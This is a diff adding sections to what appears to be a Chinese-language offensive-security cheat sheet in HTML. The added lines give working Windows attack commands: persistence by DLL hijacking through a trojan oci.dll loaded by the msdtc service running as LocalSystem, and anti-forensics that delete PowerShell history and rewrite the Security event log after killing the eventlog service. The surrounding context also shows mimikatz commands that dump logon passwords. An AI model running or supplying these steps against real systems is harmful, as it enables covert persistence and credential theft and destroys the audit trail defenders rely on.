@@ -48,7 +48,32 @@
 	$ export TERM=xterm-256color
 	$ stty rows &lt;num&gt; columns &lt;cols&gt;
 	</pre>
+	<h2>windows 后门</h2>
+	把你的木马dll改成oci.dll，丢到system32下<br>
+	sc config msdtc start= auto<br>
+	sc config msdtc obj= LocalSystem<br>
+	sc start msdtc<br>
+	<h2>Windows 擦屁股</h2>
+	删除powershell日志：<br>
+	    C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>
+	删除远程桌面日志:<br>
+	<pre>
+			# 导出IP为127.0.0.1的日志到新日志文件
+			wevtutil epl Security C:\Windows\System32\winevt\Logs\Security_new.evtx /q:"*[EventData[(Data[@Name='IpAddress']='127.0.0.1')]]" /ow:true
 
+
+			# 杀掉eventlog服务
+			tasklist /svc | findstr "eventlog"
+			taskkill /F /PID <PID>
+
+
+			# 将导出的日志覆盖掉原来的evtx	
+			move /Y C:\Windows\System32\winevt\Logs\Security_new.evtx C:\Windows\System32\winevt\Logs\Security.evtx
+
+
+			# 启动eventlog服务
+			net start eventlog
+	</pre>
 	<h2>Mimikatz 非交互式</h2>
 	打印（输出）mimikatz执行过程的log : mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir <br>
 	读取的密码导出在mimikatz的目录输出到文本 : mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt<br>
